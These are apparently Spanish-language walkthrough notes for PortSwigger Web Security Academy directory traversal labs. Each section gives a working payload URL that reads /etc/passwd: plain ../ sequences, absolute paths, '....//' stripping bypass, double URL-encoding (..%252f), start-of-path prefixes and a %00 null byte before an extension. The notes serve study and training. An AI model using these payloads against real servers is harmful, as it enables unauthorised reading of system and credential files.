---
description: File inclusion o directory traversal
---

# Directory Traversal (Labs)

## Simple case

En este caso tenemos que acceder al "/etc/passwd". Tras mirar un poco por la página veo que las imagenes tienen la siguiente url "../image?filename=62.jpg" ¿Podemos aprovecharnos de ese filename para ver lo que queremos?

**https://ac751f301e9e944cc10b26d900c300b5.web-security-academy.net/image?filename=../../../../etc/passwd**

Pero nos aparece que no se puede mostrar la imagen, ¿Qué ocurre si vemos la respuesta por Burpsuite?

![Response en Burpsuite](<../.gitbook/assets/image (33) (1).png>)

## Traversal sequences blocked with absolute path bypass

En este caso se puede mediante rutas absolutas, no explico mucho más porque es igual que el anterior pero con una ruta absoluta:

**https://ac181fb01f1ebdd4c0ed554d00860030.web-security-academy.net/image?filename=/etc/passwd**

## Traversal sequences stripped non-recursively

En ocasiones no podemos ni a través de rutas absolutas ni con ../../../../

En estas ocasiones podemos hacer algo tipo ....//....//....//....//etc/passwd

**https://ac061ff11eb93881c0332f8c00a40015.web-security-academy.net/image?filename=....//....//....//....//etc/passwd**

## Traversal sequences stripped with superfluous URL-decode

Utilizar otros tipos de encode cómo "..%252f"

**https://acd91fb31f5d9b53c0781888009400a7.web-security-academy.net/image?filename=..%252f..%252f..%252f..%252fetc/passwd**

## Validation of start of path

Siguen siendo muy sencillitos, no hay mucho que explicar, en ocasiones tienen que comenzar desde cierto directorio:

**https://ac431fdb1fe094e5c0babc7d0047005a.web-security-academy.net/image?filename=/var/www/images/../../../../etc/passwd**

## Validation of file extension with null byte bypass

En esta ocasión tenemos que especificar un tipo concreto de archivo, por ejemplo una imagen ".jpg, .png..." así que si utilizamos un null byte antes "%00" podemos terminar el directorio antes de llegar a la extensión.

**https://ac5e1fde1f19be06c02023f700b60052.web-security-academy.net/image?filename=../../../../etc/passwd%00.jpg**

Me parece interesante la parte de defensa que explican desde Portswigger [https://portswigger.net/web-security/file-path-traversal](https://portswigger.net/web-security/file-path-traversal)
